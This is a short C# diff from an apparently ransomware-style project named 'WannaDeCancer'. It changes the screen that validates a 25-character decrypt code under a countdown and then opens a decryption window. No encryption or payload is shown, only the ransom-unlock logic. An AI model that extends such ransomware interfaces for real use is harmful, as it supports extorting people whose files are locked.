@@ -120,6 +120,8 @@ namespace WannaDeCancer
             if (ValidateDecryptVal() && span > TimeSpan.Zero)
             {
                 MessageBox.Show("Yayyyyy, The code is valid, Now We will decrypt your files!", "Your files is safe!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                Decrypt decrypt = new Decrypt(keygen);
+                decrypt.Show();
             }
             else if (!ValidateDecryptVal() && span > TimeSpan.Zero)
                 MessageBox.Show("Please check your Decrypt Value!", "Wrong Decrypt Value", MessageBoxButtons.OK, MessageBoxIcon.Warning);
@@ -131,6 +133,9 @@ namespace WannaDeCancer
         private bool ValidateDecryptVal()
         {
             char[] inputValue = txbDecryptValue.Text.ToArray();
+
+            if (inputValue.Length != 25)
+                return false;
 
             for (int i = 0; i < 25; i++)
             {
